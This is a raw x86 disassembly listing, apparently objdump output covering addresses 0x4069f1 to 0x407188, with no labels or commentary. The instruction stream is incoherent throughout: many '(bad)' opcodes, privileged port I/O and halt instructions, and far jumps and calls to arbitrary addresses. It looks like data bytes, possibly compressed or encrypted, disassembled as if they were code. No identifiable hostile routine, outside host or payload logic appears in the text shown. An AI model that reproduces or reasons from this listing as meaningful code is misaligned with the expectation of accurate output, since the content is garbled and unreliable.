  4069f1:	and    dh,BYTE PTR [ebp+0x1e]
  4069f4:	in     al,dx
  4069f5:	or     eax,0x28a23af4
  4069fa:	loopne 0x4069f0
  4069fc:	and    DWORD PTR [ebp+eiz*2-0x49ba9133],ebx
  406a03:	xchg   esp,eax
  406a04:	pop    eax
  406a05:	xchg   edx,eax
  406a06:	push   0x19a9470f
  406a0b:	cwde   
  406a0c:	loope  0x406a8c
  406a0e:	mov    al,ds:0x4e3362c2
  406a13:	(bad)  
  406a16:	xor    DWORD PTR [edi+0x7a],eax
  406a19:	out    dx,al
  406a1a:	popf   
  406a1b:	sub    eax,0x6b3062c0
  406a20:	aad    0xe0
  406a22:	xchg   edi,eax
  406a23:	push   ebx
  406a24:	inc    esp
  406a25:	hlt    
  406a26:	div    DWORD PTR [esi+0xd]
  406a29:	test   al,0x9b
  406a2b:	adc    dh,al
  406a2d:	push   es
  406a2e:	pop    es
  406a2f:	sbb    dl,BYTE PTR [eax-0x6d]
  406a32:	and    edx,DWORD PTR [ecx-0x77]
  406a35:	mov    esp,0x65fecd2e
  406a3a:	scas   eax,DWORD PTR es:[edi]
  406a3b:	cmp    DWORD PTR ds:0xc1ec979b,esp
  406a41:	ja     0x406a1e
  406a43:	pop    eax
  406a44:	sahf   
  406a45:	cmp    ecx,DWORD PTR [eax]
  406a47:	in     eax,0xa2
  406a49:	test   BYTE PTR [ecx],dl
  406a4b:	jno    0x406a4c
  406a4d:	sub    DWORD PTR [edi-0x2d],edi
  406a50:	mov    edi,0xfb75b683
  406a55:	lds    ecx,FWORD PTR [ecx-0x75c8856f]
  406a5b:	add    BYTE PTR [ebx+ecx*4+0x27],dl
  406a5f:	jno    0x406aa2
  406a61:	or     esi,0x70
  406a64:	mov    bh,dl
  406a66:	push   ds
  406a67:	add    eax,0x22eb2a59
  406a6c:	ds int3 
  406a6e:	xor    dl,BYTE PTR [edi+0x52cf2e22]
  406a74:	or     BYTE PTR [edi-0x6f563f76],0x5d
  406a7b:	pop    es
  406a7c:	and    ebp,DWORD PTR [edx-0x5debd3d4]
  406a82:	inc    ebx
  406a83:	xchg   ecx,eax
  406a84:	sbb    DWORD PTR [ecx-0xa],0x7d1fa2e6
  406a8b:	mov    cl,0xa0
  406a8d:	mov    cl,0x95
  406a8f:	adc    esp,DWORD PTR [ebx]
  406a91:	jp     0x406a5b
  406a93:	ins    DWORD PTR es:[edi],dx
  406a94:	push   eax
  406a95:	push   ecx
  406a96:	cwde   
  406a97:	push   eax
  406a98:	and    BYTE PTR [edi-0x56],ah
  406a9b:	imul   ebx,ecx,0x3
  406a9e:	xchg   ebx,eax
  406a9f:	in     eax,dx
  406aa0:	div    DWORD PTR [ecx-0x66]
  406aa3:	ja     0x406a70
  406aa5:	inc    edi
  406aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aa7:	pop    es
  406aa8:	cwde   
  406aa9:	xor    edx,DWORD PTR [ecx]
  406aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aac:	mov    ds:0x17abc421,al
  406ab1:	dec    ebp
  406ab2:	call   0xa4bfcc95
  406ab7:	sbb    al,0xcc
  406ab9:	jnp    0x406b2b
  406abb:	shr    DWORD PTR [bp+si],cl
  406abe:	and    cl,al
  406ac0:	imul   DWORD PTR [esi-0x2]
  406ac3:	stc    
  406ac4:	pop    esp
  406ac5:	push   es
  406ac6:	cwde   
  406ac7:	retf   
  406ac8:	and    esi,esi
  406aca:	jb     0x406aae
  406acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406acd:	sbb    dh,dh
  406acf:	mov    edx,0xa4ecda6e
  406ad4:	push   esi
  406ad5:	xor    al,0x61
  406ad7:	cmp    eax,0xa8196758
  406adc:	cmp    eax,0x501cd625
  406ae1:	clc    
  406ae2:	aad    0x87
  406ae4:	js     0x406a83
  406ae6:	in     al,dx
  406ae7:	jae    0x406a82
  406ae9:	in     al,0xf0
  406aeb:	cmp    ah,BYTE PTR fs:[edi+esi*1-0x4f]
  406af0:	js     0x406b31
  406af2:	xlat   BYTE PTR ds:[ebx]
  406af3:	adc    DWORD PTR [ecx+0x38c2d254],edx
  406af9:	sub    bl,dh
  406afb:	xor    eax,0x6c86092b
  406b00:	jmp    0xa8e5:0xae87744b
  406b07:	sub    edx,DWORD PTR [edi+ecx*8+0x7ffd45e4]
  406b0e:	(bad)  
  406b0f:	fiadd  WORD PTR [eax]
  406b11:	xchg   ebx,ebx
  406b13:	pop    esp
  406b14:	shr    DWORD PTR [esi+ebx*1],cl
  406b17:	xchg   BYTE PTR [edi+0x66],bl
  406b1a:	jnp    0x406b28
  406b1c:	xor    bl,cl
  406b1e:	xor    al,0x17
  406b20:	in     eax,0xf7
  406b22:	inc    esi
  406b23:	and    eax,0xc2577cb1
  406b28:	dec    eax
  406b29:	push   ebp
  406b2a:	adc    bh,bl
  406b2c:	stos   DWORD PTR es:[edi],eax
  406b2d:	fldcw  WORD PTR ds:0x69be01cc
  406b33:	mov    ecx,0x43513182
  406b38:	xor    edx,DWORD PTR [edx]
  406b3a:	or     bl,BYTE PTR [edi-0x4f]
  406b3d:	bound  edx,QWORD PTR [esi]
  406b3f:	sub    WORD PTR [esi],si
  406b42:	xchg   ebp,eax
  406b43:	mov    esi,0x1c2b8b23
  406b48:	out    dx,al
  406b49:	xchg   ecx,eax
  406b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b4b:	sub    eax,0xd3f995c3
  406b50:	in     al,dx
  406b51:	xchg   ebp,eax
  406b52:	push   esp
  406b53:	js     0x406b18
  406b55:	mov    eax,ds:0x13ab8850
  406b5a:	bound  eax,QWORD PTR [ecx+eiz*1]
  406b5d:	pop    ss
  406b5e:	mov    bh,0x75
  406b60:	mov    WORD PTR [ebx-0x42],ds
  406b63:	imul   ecx,DWORD PTR [esi],0x26813d5f
  406b69:	mov    ebx,0x58c8d26d
  406b6e:	out    0xf8,al
  406b70:	sti    
  406b71:	dec    BYTE PTR [edi-0x20792303]
  406b77:	xchg   ebx,eax
  406b78:	and    al,0x89
  406b7a:	ss adc al,0xed
  406b7d:	es dec ebx
  406b7f:	push   ebx
  406b80:	mov    WORD PTR [edi],fs
  406b82:	ins    DWORD PTR es:[edi],dx
  406b83:	jo     0x406bcc
  406b85:	push   ss
  406b86:	or     DWORD PTR [esi],ecx
  406b88:	mov    esp,DWORD PTR [esi+0x298faa52]
  406b8e:	pop    edx
  406b8f:	xor    al,BYTE PTR [ebx-0x2a]
  406b92:	dec    eax
  406b93:	aam    0x2d
  406b95:	hlt    
  406b96:	cmp    ch,ah
  406b98:	push   cs
  406b99:	popf   
  406b9a:	dec    esp
  406b9b:	xchg   ebp,eax
  406b9c:	(bad)  
  406b9d:	lock pop esi
  406b9f:	push   ds
  406ba0:	xor    BYTE PTR [eax],dh
  406ba2:	push   esi
  406ba3:	push   ebp
  406ba4:	dec    esp
  406ba5:	and    DWORD PTR [esi],esp
  406ba7:	in     eax,dx
  406ba8:	ins    BYTE PTR es:[edi],dx
  406ba9:	mov    ebx,DWORD PTR [esi]
  406bab:	daa    
  406bac:	sub    DWORD PTR [esi+ecx*1+0x7],ecx
  406bb0:	sub    al,0xfb
  406bb2:	jp     0x406bc4
  406bb4:	jl     0x406c2c
  406bb6:	stc    
  406bb7:	and    BYTE PTR [eax],ah
  406bb9:	ins    BYTE PTR es:[edi],dx
  406bba:	rol    DWORD PTR [ebx],1
  406bbc:	loop   0x406baf
  406bbe:	sti    
  406bbf:	xor    BYTE PTR [ebp-0x7d],cl
  406bc2:	sbb    ebp,DWORD PTR [edi+0x2f]
  406bc5:	rcl    BYTE PTR [eax+0x64],1
  406bc8:	sub    bl,bh
  406bca:	mov    eax,ds:0x7135304
  406bcf:	mov    ecx,0x34200c2e
  406bd4:	shl    BYTE PTR [ebp+ecx*4-0x12e3ffa2],1
  406bdb:	(bad)  
  406bdc:	cmp    eax,0xd126803f
  406be1:	add    al,0xd8
  406be3:	fcom   QWORD PTR [edx]
  406be5:	fidivr WORD PTR [edx-0x28]
  406be8:	fadd   st(6),st
  406bea:	repz (bad) 
  406bec:	sbb    ah,BYTE PTR [eax-0x1c]
  406bef:	cdq    
  406bf0:	les    esp,FWORD PTR [ecx]
  406bf2:	add    esp,DWORD PTR [edi]
  406bf4:	add    DWORD PTR [edx],ebp
  406bf6:	cmp    DWORD PTR [edx],0xf8946663
  406bfc:	dec    ebx
  406bfd:	cld    
  406bfe:	push   esp
  406bff:	mov    ebp,0xb2abdb41
  406c04:	cwde   
  406c05:	ja     0x406b99
  406c07:	lea    esi,[ebx+0xf]
  406c0a:	cdq    
  406c0b:	jno    0x406b9d
  406c0d:	cmc    
  406c0e:	adc    al,0x66
  406c10:	iret   
  406c11:	and    eax,0x58aefb9d
  406c16:	jbe    0x406c0b
  406c18:	mov    dl,0x45
  406c1a:	pop    ss
  406c1b:	sub    eax,0xe2403f1b
  406c20:	mov    ebx,0xab4b4515
  406c25:	jp     0x406bf1
  406c27:	iret   
  406c28:	jne    0x406c44
  406c2a:	bound  esp,QWORD PTR [ebx]
  406c2c:	adc    DWORD PTR [esi+ecx*4],esp
  406c2f:	hlt    
  406c30:	loopne 0x406c4f
  406c32:	mov    edi,DWORD PTR [edx+0x7c]
  406c35:	pop    ss
  406c36:	sbb    cl,BYTE PTR [ebp-0x5cdc6dea]
  406c3c:	call   esp
  406c3e:	jnp    0x406be2
  406c40:	test   ebp,edx
  406c42:	cwde   
  406c43:	inc    edi
  406c44:	iret   
  406c45:	(bad)  
  406c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c47:	das    
  406c48:	dec    ebx
  406c49:	push   eax
  406c4a:	lahf   
  406c4b:	enter  0xecbb,0xbf
  406c4f:	out    0xb,al
  406c51:	sbb    DWORD PTR [edx-0x46e1425b],edi
  406c57:	adc    ch,dl
  406c59:	mov    dl,0x30
  406c5b:	mov    es,WORD PTR [esi-0x278771b6]
  406c61:	xchg   DWORD PTR [esi-0x6425cc94],esp
  406c67:	dec    esi
  406c68:	ror    ecx,cl
  406c6a:	dec    ecx
  406c6b:	repz iret 
  406c6d:	adc    DWORD PTR [esi-0x21],esi
  406c70:	or     ebx,DWORD PTR [edi]
  406c72:	push   ebp
  406c73:	lods   eax,DWORD PTR ds:[esi]
  406c74:	sub    al,ah
  406c76:	js     0x406c05
  406c78:	adc    ah,bh
  406c7a:	ja     0x406ce9
  406c7c:	adc    eax,0xcd202ccf
  406c81:	add    edx,DWORD PTR ds:0xd4565cd9
  406c87:	cmp    edx,eax
  406c89:	push   0xa
  406c8b:	lds    edx,FWORD PTR [edx+eax*2-0x33]
  406c8f:	xlat   BYTE PTR ds:[ebx]
  406c90:	ins    BYTE PTR es:[edi],dx
  406c91:	pop    ecx
  406c92:	xor    ebx,DWORD PTR [edi]
  406c94:	fs sbb al,ah
  406c97:	mov    esi,0x73639299
  406c9c:	add    al,0xe3
  406c9e:	cmp    DWORD PTR [edi],eax
  406ca0:	int    0xd
  406ca2:	inc    edx
  406ca3:	jge    0x406c6f
  406ca5:	xor    ecx,eax
  406ca7:	mov    dl,bl
  406ca9:	pop    es
  406caa:	mov    ah,0x90
  406cac:	aaa    
  406cad:	xor    al,0x1a
  406caf:	pop    ebx
  406cb0:	jb     0x406c87
  406cb2:	shl    BYTE PTR [ecx-0x5b356c84],1
  406cb8:	xor    dl,ch
  406cba:	(bad)  
  406cbb:	retf   
  406cbc:	ret    0x5fd8
  406cbf:	leave  
  406cc0:	sub    BYTE PTR [ecx],bl
  406cc2:	jns    0x406cd8
  406cc4:	inc    ecx
  406cc5:	push   esp
  406cc6:	fidivr WORD PTR [edi-0x94c8966]
  406ccc:	lahf   
  406ccd:	mov    bl,0x62
  406ccf:	xor    edi,ebx
  406cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd2:	mov    DWORD PTR ds:0x2bcb16c1,edi
  406cd8:	es ret 
  406cda:	fild   QWORD PTR [eax-0x570a4339]
  406ce0:	add    DWORD PTR ds:0x2112efe0,esi
  406ce6:	sub    esp,DWORD PTR fs:[edi+0x76]
  406cea:	pop    edx
  406ceb:	push   edi
  406cec:	mov    DWORD PTR [ecx-0x2aba5328],ebx
  406cf2:	int3   
  406cf3:	mov    WORD PTR [esi+0x233bb5bc],fs
  406cf9:	dec    esi
  406cfa:	inc    ebx
  406cfb:	(bad)  
  406cfc:	jae    0x406d0a
  406cfe:	dec    ecx
  406cff:	loopne 0x406cd3
  406d01:	stc    
  406d02:	outs   dx,BYTE PTR ds:[esi]
  406d03:	and    al,BYTE PTR [ecx+0x34]
  406d06:	pop    esp
  406d07:	stos   DWORD PTR es:[edi],eax
  406d08:	aaa    
  406d09:	out    dx,al
  406d0a:	mov    bl,0x18
  406d0c:	cwde   
  406d0d:	(bad)  
  406d0e:	or     ecx,DWORD PTR [esi+0xea87048]
  406d14:	push   edi
  406d15:	jmp    0x68e7:0xa488fc16
  406d1c:	(bad)  
  406d1d:	call   0xbd0ed2fb
  406d22:	ds pop esi
  406d24:	sar    BYTE PTR [eax-0x42],1
  406d27:	mov    ch,0x8c
  406d29:	shl    BYTE PTR [ecx+0x78ad798],0xa
  406d30:	xchg   edi,eax
  406d31:	mov    esi,0x4dea25aa
  406d36:	xor    DWORD PTR [esi-0x7e],ecx
  406d39:	jmp    0xc082:0xc5e7e624
  406d40:	mov    ch,0x39
  406d42:	mov    eax,ds:0x7224a545
  406d47:	addr16 mov ax,ds:0x955a
  406d4c:	sti    
  406d4d:	int3   
  406d4e:	xor    al,0xbf
  406d50:	clc    
  406d51:	out    dx,eax
  406d52:	mov    DWORD PTR [edx+edi*1-0x4],esi
  406d56:	add    ebp,edx
  406d58:	and    ch,BYTE PTR [ebp+0x6b6f0bbc]
  406d5e:	mov    ebx,0xc8304d97
  406d63:	repnz cli 
  406d65:	sbb    edx,edi
  406d67:	and    cl,BYTE PTR [ecx-0x42d7f04a]
  406d6d:	addr16 jmp 0x406d31
  406d70:	sbb    DWORD PTR [esi],edx
  406d72:	sub    DWORD PTR [edi],edi
  406d74:	ins    BYTE PTR es:[edi],dx
  406d75:	add    BYTE PTR [ebx],al
  406d77:	das    
  406d78:	ja     0x406db5
  406d7a:	xchg   edi,eax
  406d7b:	adc    esi,DWORD PTR [ecx-0x31ad6c70]
  406d81:	push   es
  406d82:	mov    cl,0x3d
  406d84:	cmp    ah,BYTE PTR [edx-0x5]
  406d87:	stc    
  406d88:	xchg   edi,eax
  406d89:	push   0x87b6156a
  406d8e:	aaa    
  406d8f:	inc    edx
  406d90:	ror    BYTE PTR [ecx+0x4413b28c],1
  406d96:	out    dx,eax
  406d97:	clc    
  406d98:	mov    edx,0x17a3abd6
  406d9d:	or     al,0xd6
  406d9f:	push   edx
  406da0:	and    al,0x7b
  406da2:	add    eax,DWORD PTR [edi-0xafd1698]
  406da8:	out    0xf,eax
  406daa:	inc    esi
  406dab:	fwait
  406dac:	loopne 0x406d56
  406dae:	int    0x6f
  406db0:	push   0x48d99ee1
  406db5:	xor    DWORD PTR [ebp-0x53],eax
  406db8:	stos   DWORD PTR es:[edi],eax
  406db9:	mov    BYTE PTR [esi],ch
  406dbb:	mov    ds:0x948d6cd,eax
  406dc0:	xlat   BYTE PTR ds:[ebx]
  406dc1:	push   esi
  406dc2:	das    
  406dc3:	mov    ebp,0x823835a3
  406dc8:	cmp    DWORD PTR [esi],edi
  406dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dcb:	jle    0x406e31
  406dcd:	ror    BYTE PTR [ebx-0x55],1
  406dd0:	push   ecx
  406dd1:	out    0x9f,al
  406dd3:	fidivr DWORD PTR [esi-0x29]
  406dd6:	sbb    DWORD PTR [edi+eax*8+0x3e],ebp
  406dda:	in     eax,dx
  406ddb:	hlt    
  406ddc:	add    esi,DWORD PTR [edx-0x1e]
  406ddf:	jge    0x406e01
  406de1:	mov    ebx,ecx
  406de3:	and    esi,DWORD PTR [eax-0x3b06be66]
  406de9:	loop   0x406e46
  406deb:	je     0x406dc5
  406ded:	sbb    BYTE PTR [edi-0x55],bl
  406df0:	lods   eax,DWORD PTR ds:[esi]
  406df1:	imul   ebx,DWORD PTR [ebp+0x0],0x7b2513cd
  406df8:	mov    ebp,0x39f1da8b
  406dfd:	fs in  al,0xe1
  406e00:	sbb    ah,BYTE PTR [edx+0x50]
  406e03:	inc    edi
  406e04:	xor    BYTE PTR [edx+esi*8+0x18a4ad81],0xf0
  406e0c:	ds dec edx
  406e0e:	xlat   BYTE PTR ds:[ebx]
  406e0f:	arpl   WORD PTR [ebx],si
  406e11:	test   BYTE PTR [edi],dh
  406e13:	and    dl,BYTE PTR [eax]
  406e15:	je     0x406de5
  406e17:	mov    al,0x87
  406e19:	ins    BYTE PTR es:[edi],dx
  406e1a:	sbb    eax,0x7f1c9cd9
  406e1f:	loope  0x406dcb
  406e21:	pop    ecx
  406e22:	loop   0x406e6c
  406e24:	xor    edi,ebp
  406e26:	mov    eax,0xe42cc130
  406e2b:	in     eax,dx
  406e2c:	jns    0xa4adc9e6
  406e32:	(bad)  
  406e33:	sti    
  406e34:	dec    ebp
  406e35:	mov    di,0x77ce
  406e39:	push   esp
  406e3a:	ds dec esi
  406e3c:	fsubr  DWORD PTR [edi+0x44ef9217]
  406e42:	xor    BYTE PTR [edx],0xea
  406e45:	dec    edi
  406e46:	into   
  406e47:	pop    es
  406e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e49:	mov    ebp,0x51979472
  406e4e:	push   ds
  406e4f:	fsub   DWORD PTR [ebx-0x40]
  406e52:	pop    ss
  406e53:	stos   BYTE PTR es:[edi],al
  406e54:	cmp    al,0x5
  406e56:	mov    esp,0x4969d8a7
  406e5b:	mov    dl,0x9c
  406e5d:	ds mov ecx,0x11da538f
  406e63:	call   0xdf95:0x43d80e3b
  406e6a:	pop    edi
  406e6b:	adc    dl,BYTE PTR [eax]
  406e6d:	test   al,0xe
  406e6f:	retf   
  406e70:	shr    DWORD PTR [eax+edi*2+0x4d],cl
  406e74:	xchg   esi,eax
  406e75:	cmc    
  406e76:	mov    bl,0x6c
  406e78:	jmp    0x648947fe
  406e7d:	sbb    DWORD PTR [edi],ecx
  406e7f:	mov    ebx,0x3b3971e8
  406e84:	jg     0x406e17
  406e86:	cdq    
  406e87:	cmp    DWORD PTR [ebp+0x7d737239],esi
  406e8d:	sbb    DWORD PTR [edi+0x594e0be8],0xffffffc9
  406e94:	popf   
  406e95:	sahf   
  406e96:	and    BYTE PTR [esi-0x33],cl
  406e99:	bound  ebx,QWORD PTR [ecx-0x38e12b1f]
  406e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ea0:	aad    0x4c
  406ea2:	and    esp,DWORD PTR [ecx-0x6c]
  406ea5:	call   0xbd6d390a
  406eaa:	rol    DWORD PTR [ebx-0x65],0x1b
  406eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eaf:	repnz sti 
  406eb1:	xchg   esi,eax
  406eb2:	jle    0x406edb
  406eb4:	sbb    dl,BYTE PTR [esi+0x4bce29a3]
  406eba:	aaa    
  406ebb:	loop   0x406f25
  406ebd:	popa   
  406ebe:	in     al,0x86
  406ec0:	dec    esp
  406ec1:	inc    esi
  406ec2:	mov    ds:0x83f8181d,eax
  406ec7:	cmovb  edi,DWORD PTR [esi+edi*1+0x2d]
  406ecc:	pusha  
  406ecd:	cmp    BYTE PTR [ebx],bl
  406ecf:	fs jp  0x406ee9
  406ed2:	popf   
  406ed3:	adc    DWORD PTR [edx+0xd],ecx
  406ed6:	adc    ecx,DWORD PTR [ebx]
  406ed8:	add    esi,DWORD PTR [edi+0x4d]
  406edb:	(bad)  
  406edc:	jmp    0xe85e5318
  406ee1:	test   al,0xd5
  406ee3:	call   esp
  406ee5:	iret   
  406ee6:	scas   al,BYTE PTR es:[edi]
  406ee7:	pop    edx
  406ee8:	mov    cl,0x24
  406eea:	popf   
  406eeb:	fdivr  st(5),st
  406eed:	out    0x96,eax
  406eef:	lods   al,BYTE PTR ds:[esi]
  406ef0:	jecxz  0x406f2b
  406ef2:	das    
  406ef3:	sub    cl,dl
  406ef5:	sub    bh,BYTE PTR [eax-0x5442ea13]
  406efb:	jne    0x406ec2
  406efd:	cmp    esp,DWORD PTR [ebx]
  406eff:	inc    esi
  406f00:	daa    
  406f01:	xchg   esi,eax
  406f02:	cmp    eax,0xee6f5d82
  406f07:	shl    BYTE PTR [esi-0xb523f1f],1
  406f0d:	(bad)  [ecx+0xb]
  406f10:	fcom   QWORD PTR [esi+0x11b30663]
  406f16:	push   ecx
  406f17:	mov    eax,0x7a15567e
  406f1c:	push   0xa7798c6a
  406f21:	in     eax,0xb6
  406f23:	sub    edi,edx
  406f25:	push   eax
  406f26:	(bad)  
  406f27:	call   0x6608:0x45324df4
  406f2e:	out    dx,eax
  406f2f:	ss rcr ebp,0xb4
  406f33:	pop    es
  406f34:	jecxz  0x406f30
  406f36:	mov    edx,0x8b275c8b
  406f3b:	(bad)  
  406f3c:	js     0x406f87
  406f3e:	add    DWORD PTR [esi-0x6a],0x2f341521
  406f45:	sub    BYTE PTR [esp+esi*1+0x2],bh
  406f49:	int    0x98
  406f4b:	hlt    
  406f4c:	adc    eax,0xeac07517
  406f51:	scas   eax,DWORD PTR es:[edi]
  406f52:	sub    al,0xbb
  406f54:	pop    ecx
  406f55:	pop    ss
  406f56:	sbb    dl,0x5b
  406f59:	xchg   ecx,eax
  406f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f5b:	push   ebp
  406f5c:	or     cl,BYTE PTR [edi]
  406f5e:	js     0x1033e098
  406f64:	add    DWORD PTR [edi+ebx*4],esp
  406f67:	mov    edi,0x6076ed13
  406f6c:	push   ss
  406f6d:	cwde   
  406f6e:	(bad)  
  406f6f:	fistp  QWORD PTR [esi+0x337634e3]
  406f75:	cmp    BYTE PTR [eax+0x6f7111d6],bh
  406f7b:	mov    ch,cl
  406f7d:	lock shrd DWORD PTR [ecx-0x11],ecx,cl
  406f82:	sbb    BYTE PTR [edi+0x1ed7c26b],ah
  406f88:	out    0xd9,eax
  406f8a:	and    eax,0xe84b183
  406f8f:	or     eax,edx
  406f91:	(bad)  
  406f92:	xor    eax,0x40839a87
  406f97:	ret    
  406f98:	aas    
  406f99:	test   DWORD PTR [ecx+edi*4-0x4535dfad],esi
  406fa0:	pop    edx
  406fa1:	mov    ds:0x438e8a68,al
  406fa6:	adc    eax,DWORD PTR [esi]
  406fa8:	or     cl,dl
  406faa:	mov    eax,ds:0x8fd31be4
  406faf:	(bad)  
  406fb0:	dec    ebp
  406fb1:	mov    ebp,0xd09420a2
  406fb6:	dec    esi
  406fb7:	and    DWORD PTR [ebp+0x194b382e],0x9cc7d763
  406fc1:	sub    DWORD PTR [edx+ecx*4],ebx
  406fc4:	fdiv   QWORD PTR [esi]
  406fc6:	add    bh,dh
  406fc8:	push   ebp
  406fc9:	pushf  
  406fca:	ret    0x73c4
  406fcd:	stos   BYTE PTR es:[edi],al
  406fce:	mov    ebp,0x35d0402c
  406fd3:	inc    esp
  406fd4:	nop
  406fd5:	and    DWORD PTR [edi-0x67],ebp
  406fd8:	test   al,0x69
  406fda:	loop   0x407052
  406fdc:	cwde   
  406fdd:	push   esp
  406fde:	xchg   ecx,eax
  406fdf:	push   esi
  406fe0:	or     ch,BYTE PTR [edx-0x2b7310c5]
  406fe6:	data16 jb 0x40701d
  406fe9:	push   ecx
  406fea:	xor    al,dh
  406fec:	in     eax,dx
  406fed:	inc    ecx
  406fee:	mov    WORD PTR [ebp-0x323a5925],?
  406ff4:	add    al,BYTE PTR [ebx]
  406ff6:	or     BYTE PTR [edi+edx*1],al
  406ff9:	arpl   si,bp
  406ffb:	mov    cl,0xc
  406ffd:	and    eax,ebx
  406fff:	xlat   BYTE PTR ds:[ebx]
  407000:	out    dx,eax
  407001:	(bad)  
  407002:	fucomp st(5)
  407004:	into   
  407005:	sti    
  407006:	pop    edx
  407007:	cmp    al,0xea
  407009:	cwde   
  40700a:	mov    WORD PTR [esi-0x15],es
  40700d:	sbb    al,bh
  40700f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407010:	inc    edx
  407011:	inc    esp
  407012:	xchg   ebp,eax
  407013:	add    BYTE PTR [esi],bl
  407015:	das    
  407016:	dec    eax
  407017:	cdq    
  407018:	mov    ecx,0x79f63599
  40701d:	lea    edx,[edx]
  40701f:	test   DWORD PTR [ebx+ecx*4],0x6b28249b
  407026:	stos   DWORD PTR es:[edi],eax
  407027:	add    eax,DWORD PTR ds:0xb9bb5000
  40702d:	data16 int 0x4f
  407030:	pushf  
  407031:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  407033:	lods   al,BYTE PTR ds:[esi]
  407034:	inc    edi
  407035:	sbb    ebp,DWORD PTR ds:0x14d215fd
  40703b:	mov    eax,0xbb0a2fda
  407040:	aam    0x8d
  407042:	push   esi
  407043:	inc    ebp
  407044:	dec    ebp
  407045:	dec    esi
  407046:	sahf   
  407047:	xor    esi,DWORD PTR [ebx-0x24]
  40704a:	pop    ss
  40704b:	jmp    0xcd7e:0xf20611eb
  407052:	mov    eax,0x354f73b2
  407057:	xor    eax,0xd956464e
  40705c:	sub    al,0x1
  40705e:	sub    ah,BYTE PTR [ebx-0x4]
  407061:	(bad)  
  407062:	and    eax,DWORD PTR [edx]
  407064:	enter  0xc263,0x17
  407068:	fnstcw WORD PTR [edi]
  40706a:	mov    eax,0xaa0c860b
  40706f:	jmp    0x1d1f9a06
  407074:	xor    DWORD PTR [edx+0x21],eax
  407077:	adc    al,0xf5
  407079:	xor    eax,0x2cccbe20
  40707e:	retf   0x1e16
  407081:	int3   
  407082:	push   ecx
  407083:	pusha  
  407084:	mov    ebp,0x72302779
  407089:	test   al,0x4d
  40708b:	mov    DWORD PTR [edx-0x29d82c64],ebx
  407091:	aad    0x7d
  407093:	mov    es,WORD PTR [ecx]
  407095:	test   BYTE PTR [esp+eiz*8],cl
  407098:	jnp    0x407105
  40709a:	inc    esp
  40709b:	adc    esp,DWORD PTR [ecx+edi*2]
  40709e:	sbb    bh,0xfa
  4070a1:	mov    WORD PTR [ecx],?
  4070a3:	(bad)  
  4070a4:	daa    
  4070a5:	out    dx,al
  4070a6:	push   esp
  4070a7:	rcr    DWORD PTR [edi+esi*4],1
  4070aa:	pminsw mm4,QWORD PTR [edx+0xc5cb736]
  4070b1:	inc    ebp
  4070b2:	icebp  
  4070b3:	lea    esp,[ecx]
  4070b5:	push   esi
  4070b6:	or     DWORD PTR [edx-0x11],0x88ea6770
  4070bd:	adc    BYTE PTR [ebx+0x70128b99],0x80
  4070c4:	loope  0x40705d
  4070c6:	inc    esi
  4070c7:	jge    0x4070b7
  4070c9:	sbb    dl,bh
  4070cb:	fwait
  4070cc:	xchg   esi,eax
  4070cd:	mov    ch,0x70
  4070cf:	int    0x58
  4070d1:	fwait
  4070d2:	jle    0x407128
  4070d4:	jmp    esi
  4070d6:	in     eax,0xe
  4070d8:	in     eax,0xe0
  4070da:	leave  
  4070db:	(bad)  
  4070dc:	cmp    eax,0xc4cc2775
  4070e1:	pop    edx
  4070e2:	pusha  
  4070e3:	mov    ah,0xce
  4070e5:	push   0x57c1484b
  4070ea:	add    al,0xed
  4070ec:	out    0x10,al
  4070ee:	cwde   
  4070ef:	push   0x83a7cbdf
  4070f4:	aaa    
  4070f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f6:	pop    ds
  4070f7:	es dec esp
  4070f9:	xchg   ebx,eax
  4070fa:	mov    ?,eax
  4070fc:	mov    ds:0x7a6cecc7,eax
  407101:	(bad)  
  407102:	mov    bx,0xdc99
  407106:	mov    ch,0x6f
  407108:	jmp    0x7958b689
  40710d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40710e:	(bad)  
  40710f:	into   
  407110:	leave  
  407111:	stos   BYTE PTR es:[edi],al
  407112:	adc    BYTE PTR [ebp-0x24d6dcf],ch
  407118:	mov    edx,0xae5c1d3
  40711d:	repnz hlt 
  40711f:	and    DWORD PTR [edi],0xfffffffa
  407122:	aas    
  407123:	pop    esp
  407124:	add    eax,0x3f6e07b8
  407129:	or     DWORD PTR [ebx-0x55],0x29a4e258
  407130:	mov    ecx,ss
  407132:	icebp  
  407133:	mov    edi,0xe94e769f
  407138:	out    0x45,eax
  40713a:	fdiv   QWORD PTR [ecx]
  40713c:	inc    esp
  40713d:	pop    ebx
  40713e:	xor    al,0x4b
  407140:	xchg   ebp,eax
  407141:	jg     0x407126
  407143:	(bad)  
  407144:	or     DWORD PTR [edi+0x121d553f],esi
  40714a:	pop    es
  40714b:	shr    esp,1
  40714d:	mov    esp,0xf5985b1a
  407152:	(bad)  
  407153:	shl    BYTE PTR [ebx-0x59],1
  407156:	stos   DWORD PTR es:[edi],eax
  407157:	mov    eax,ds:0xe3d9987e
  40715c:	leave  
  40715d:	and    al,BYTE PTR [esi+0x3b]
  407160:	outs   dx,BYTE PTR ds:[esi]
  407161:	xor    dl,ah
  407163:	in     al,dx
  407164:	nop
  407165:	xchg   ebp,eax
  407166:	sub    BYTE PTR [esi-0x61e5f6ba],ch
  40716c:	jmp    0x292728e7
  407171:	mov    BYTE PTR [edi-0xd0d0df],0x80
  407178:	add    eax,0x1a2afb4a
  40717d:	xchg   BYTE PTR ds:0x92c9616b,dh
  407183:	aas    
  407184:	pop    ecx
  407185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407186:	cmc    
  407187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407188:	mov    eax,0xeebb649e
